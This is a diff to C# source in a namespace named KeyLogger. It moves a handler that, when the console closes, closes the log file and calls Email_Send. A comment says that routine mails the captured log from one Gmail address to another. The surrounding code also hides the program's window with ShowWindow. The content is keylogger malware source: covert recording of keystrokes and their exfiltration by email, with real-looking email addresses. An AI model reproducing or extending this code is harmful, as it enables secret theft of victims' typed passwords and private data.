@@ -29,9 +29,29 @@ namespace KeyLogger
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         #endregion
+
         #region FileWriting
         public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
         public static System.IO.StreamWriter myFile = null;
+        #endregion
+
+        #region ConsoleOnClose
+
+        public delegate bool ConsoleEventDelegate(int eventType);
+
+        public static bool ConsoleEventCallback(int eventType)
+        {
+            if (eventType == 2)
+            {
+                myFile.Close();
+                KeyLoggerClass.Email_Send();
+                return true;
+            }
+            return false;
+        } // when console closes
+
+        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
+
         #endregion
 
         public static void Email_Send() // send log file from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
@@ -53,25 +73,6 @@ namespace KeyLogger
 
             SmtpServer.Send(mail);
         }
-
-        #region ConsoleOnClose
-
-        public delegate bool ConsoleEventDelegate(int eventType);
-
-        public static bool ConsoleEventCallback(int eventType)
-        {
-            if (eventType == 2)
-            {
-                myFile.Close();
-                KeyLoggerClass.Email_Send();
-                return true;
-            }
-            return false;
-        } // when console closes
-
-        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
-
-        #endregion
 
         public static void HideWindow()
         {
